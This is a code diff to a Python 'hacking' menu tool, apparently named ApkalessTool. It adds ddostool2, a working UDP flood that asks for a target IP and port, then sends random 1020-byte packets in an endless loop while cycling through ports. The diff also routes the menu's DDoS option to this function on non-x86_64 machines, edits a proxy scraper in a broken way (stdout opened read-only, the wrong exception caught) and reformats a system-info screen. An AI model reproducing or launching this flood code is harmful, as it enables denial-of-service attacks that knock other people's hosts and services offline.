@@ -1,3 +1,6 @@
+from os import P_NOWAIT
+
+
 try:
      import socket
      import sys
@@ -146,6 +149,31 @@ try:
                #      starting()
      #This is The End Of Code
 
+     def ddostool2():
+          now = datetime.datetime.now()
+          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+          bytes = random._urandom(1020)
+          os.system("clear")
+          os.system("figlet DDos")
+          print("")
+          ip = input("Target IP: ")
+          print("")
+          port = int(input("Port: "))
+          os.system("clear")
+          os.system("figlet DDOS")
+          print("")
+          print("TARGET IP IS {}" .format(ip))
+          print("")
+          print("PORT IS {}" .format(port))
+          sent = 0
+          while True:
+               s.sendto(bytes, (ip, port))
+               sent = sent + 1
+               port = port + 1
+               print("sent packet %s to %s through %s %s" %(sent, ip, port, now))
+               if port == 66535:
+                    port = 1
+
      #This Code For Scanner tool
 
      def scanner():
@@ -224,18 +252,20 @@ try:
      def scraper():
           os.system("clear")
           os.system("figlet Proxies")
-          print("")
-          scrapper = Scrapper(category='ALL', print_err_trace=False)
-          data = scrapper.getProxies()
-          print("Scrapped Proxies:\n")
-          for item in data.proxies:
-               print("{}:{}" .format(item.ip, item.port))
-               time.sleep(0.1)
-          print("\nTotal Proxies:", data.len)
-          print("\nCategory of the Proxy:", data.category)
-          print("")
-          input("Press Enter To Back...")
-          starting()
+          try:
+               print("")
+               scrapper = Scrapper(category='ALL', print_err_trace=False)
+               data = scrapper.getProxies()
+               print("Scrapped Proxies:\n")
+               sys.stdout = open("/root/ApkalessTool/Test.txt", "r")
+               for item in data.proxies:
+                    print("{}:{}" .format(item.ip, item.port))
+               print("\nTotal Proxies:", data.len)
+               print("\nCategory of the Proxy:", data.category)
+               print("")
+               sys.stdout.close()
+          except ValueError:
+               print("Hello")
 
      def wifiPassword():
           print(Style.BRIGHT)
@@ -431,7 +461,10 @@ try:
                if starthacking == "2":
                     scanner()
                if starthacking == "3":
-                    ddostool()
+                    if platform.machine()=="x86_64":
+                         ddostool()
+                    else:
+                         ddostool2()
                if starthacking == "4":
                     scraper()
                if starthacking == "5":
@@ -458,12 +491,12 @@ try:
                     machine = platform.machine()
                     processor = platform.processor()
 
-                    print(Fore.GREEN + Style.NORMAL + "System:",   Fore.LIGHTBLACK_EX + Style.NORMAL + system,"\n")
-                    print(Fore.GREEN + Style.NORMAL + "Node:",     Fore.LIGHTBLACK_EX + Style.NORMAL + node,"\n")
-                    print(Fore.GREEN + Style.NORMAL + "Release:",  Fore.LIGHTBLACK_EX + Style.NORMAL + release,"\n")
-                    print(Fore.GREEN + Style.NORMAL + "Version:",  Fore.LIGHTBLACK_EX + Style.NORMAL + version,"\n")
-                    print(Fore.GREEN + Style.NORMAL + "Machine:",  Fore.LIGHTBLACK_EX + Style.NORMAL + machine,"\n")
-                    print(Fore.GREEN + Style.NORMAL + "Processor:",Fore.LIGHTBLACK_EX + Style.NORMAL + processor,"\n")
+                    print(Fore.GREEN + Style.NORMAL + "System:",          Fore.LIGHTBLACK_EX + Style.NORMAL + system,    "\n")
+                    print(Fore.GREEN + Style.NORMAL + "Device Name:",     Fore.LIGHTBLACK_EX + Style.NORMAL + node,      "\n")
+                    print(Fore.GREEN + Style.NORMAL + "Release:",         Fore.LIGHTBLACK_EX + Style.NORMAL + release,   "\n")
+                    print(Fore.GREEN + Style.NORMAL + "Version:",         Fore.LIGHTBLACK_EX + Style.NORMAL + version,   "\n")
+                    print(Fore.GREEN + Style.NORMAL + "Machine:",         Fore.LIGHTBLACK_EX + Style.NORMAL + machine,   "\n")
+                    print(Fore.GREEN + Style.NORMAL + "Processor:",       Fore.LIGHTBLACK_EX + Style.NORMAL + processor, "\n")
                     input(Fore.GREEN + Style.BRIGHT + "Press Enter To Back...")
                     starting()
                if starthacking=="9":
